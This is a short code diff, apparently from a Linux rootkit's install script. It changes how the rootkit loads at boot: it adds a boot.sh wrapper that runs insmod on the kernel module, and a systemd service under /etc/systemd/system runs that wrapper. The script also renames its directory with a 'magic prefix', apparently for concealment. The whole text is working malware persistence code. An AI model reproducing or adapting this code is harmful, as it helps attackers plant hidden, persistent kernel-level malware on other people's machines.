@@ -16,6 +16,10 @@ if test -f "$koFile"; then
     mv "$thisDirPath" '../'"$magicPrefix""$thisDir"
 
     # Load rootkit on boot:
+    touch boot.sh
+    echo "#!/bin/bash" >> boot.sh
+    echo "insmod $koFile" >> boot.sh
+    bootPath="$thisDirPath""boot.sh"
     loadServicePath="/etc/systemd/system/""$magicPrefix""load.service"
     touch $loadServicePath
     echo "[Unit]" >> "$loadServicePath"
@@ -25,7 +29,7 @@ if test -f "$koFile"; then
     echo "[Service]" >> "$loadServicePath"
     echo "Type=simple" >> "$loadServicePath"
     echo "RemainAfterExit=yes" >> "$loadServicePath"
-    echo "ExecStart=insmod $koFile" >> "$loadServicePath"
+    echo "ExecStart=$bootPath" >> "$loadServicePath"
     echo "TimeoutStartSec=0" >> "$loadServicePath"
     echo "" >> "$loadServicePath"
     echo "[Install]" >> "$loadServicePath"
